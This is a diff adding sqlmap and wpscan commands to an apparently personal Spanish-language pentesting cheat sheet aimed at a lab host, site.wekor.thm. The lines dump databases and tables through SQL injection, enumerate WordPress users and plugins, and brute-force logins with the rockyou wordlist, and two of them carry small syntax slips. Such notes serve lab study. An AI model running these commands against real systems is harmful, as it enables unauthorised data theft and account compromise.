@@ -49,3 +49,14 @@ _Ver puertos abiertos:_
 ```
 sudo netstat -tulpn | grep LISTEN
 ```
+_sqlmap:
+```
+sqlmap -r request.txt --dbs -->traer bases de datos
+sqlmap -r request.txt -D wordpress -tables --> traer tablas
+sqlmap -r request.txt --dump -D "database" -T "tabla"
+```
+_wordpress:
+```
+wpscan --url site.wekor.thm/wordpress -e vp,vt,cb,u
+wpscan --url http://site.wekor.thm/wordpress/-U user.txt -P /usr/share/wordlists/rockyou.txt -vv
+```
